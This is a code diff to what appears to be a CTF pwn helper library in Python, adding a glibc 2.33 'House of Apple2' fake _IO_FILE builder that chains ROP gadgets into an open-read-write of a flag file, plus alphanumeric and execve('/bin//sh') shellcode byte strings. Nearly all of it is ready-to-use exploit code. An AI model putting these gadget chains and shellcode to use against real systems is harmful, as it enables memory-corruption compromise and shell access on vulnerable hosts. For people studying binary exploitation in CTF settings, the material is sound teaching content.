@@ -375,6 +375,66 @@ def apple2(mode,libc_table,libc,libc_base,heap_addr,flag_addr):
             })
             return fake_IO_FILE
 
+        if libc_table == '2.33-0.5':
+            pop_rdi = libc_base + 0x0000000000028a55
+            pop_rdx = libc_base + 0x00000000000c7f32
+            pop_rsi = libc_base + 0x000000000002a4cf
+            pop_rax = libc_base + 0x0000000000044c70
+            pop_rdx_rcx_rbx = libc_base + 0x00000000000fc103
+            pop_rdx_r12 = libc_base + 0x0000000000112a51
+
+            fake_IO_FILE = flat({
+                0x0: 0,  # _IO_read_end      这几个不能用于赋值
+                0x8: 0,  # _IO_read_base     这几个不能用于赋值
+                0x10: 0,  # _IO_write_base   这几个不能用于赋值
+                0x18: 0,  # _IO_write_ptr    这几个不能用于赋值
+                0x20: pop_rdi,  # _IO_write_end    <<<----fake_IO_wide_data的起始  0x0_IO_read_ptr
+                0x28: flag_addr,  # _IO_buf_base                                    0x8:_IO_read_end
+                0x30: pop_rsi,  # _IO_buf_end                                     0x10:_IO_read_base
+                0x38: 0,  # _IO_save_base                                   0x18:_IO_write_base    <<-- 0
+                0x40: pop_rdx_rcx_rbx,  # _IO_backup_base                                 0x20:_IO_write_ptr
+                0x48: 0,  # _IO_save_end                                    0x28:_IO_write_end
+                0x50: 0,  # _markers                                        0x30:_IO_buf_base      <<-- 0
+                0x58: 0,  # _chain                                          0x38:_IO_buf_end
+                0x60: pop_rax,  # _fileno                                         0x40:_IO_save_base
+                0x68: 2,  # _old_offset                                     0x48:_IO_backup_base
+                0x70: libc_base + libc.sym["syscall"] + 27,
+                # _cur_column                                     0x50:_IO_save_end
+                0x78: pop_rdi,  # _lock                                           0x58:_IO_state
+                0x80: 3,  # _offset                                         0x60:
+                0x88: pop_rsi,  # _codecvt                                        0x68
+                0x90: heap_addr + 0x20,  # _wide_data                                      0x70:
+                0x98: pop_rdx_r12,  # _freeres_list                                   0x78
+                0xa0: 0x100,  # _freeres_buf                                    0x80
+                0xa8: 0,  # __pad5                                          0x88
+                0xb0: libc_base + libc.sym["read"],  # _mode                                           0x90
+                0xb8: pop_rdx_r12,  # 0x98
+                0xc0: 0x100,  # 0xa0
+                0xc8: libc.sym._IO_wfile_jumps + libc_base,  # vtable                                          0xa8
+                0xd0: pop_rdi,  # 0xb0
+                0xd8: 1,  # 0xb8
+                0xe0: libc_base + libc.sym["write"],  # 0xc0
+                0xe8: 0,  # 0xc8
+                0xf0: 0,  # 0xd0
+                0xf8: libc_base + 0x59020,  # mov rsp,rdx;ret 0xd8
+                0x100: heap_addr + 0x90,  # 0xe0:_wide_vtable
+            })
+            return fake_IO_FILE
+
+        else:
+            IO_FILE_plus_struct.show_struct(arch="amd64")
+            return IO_FILE_plus_struct()
+
+def ascii_shellcode(ascii,small,):
+    return b'Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t'
+
+def small_shellcode(du):
+    if du == 1:
+        return b'H1\xf6VH\xbf/bin//shWT_\xb0;\x99\x0f\x05'
+    if du ==0:
+        return b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'
+
+
 
 
 
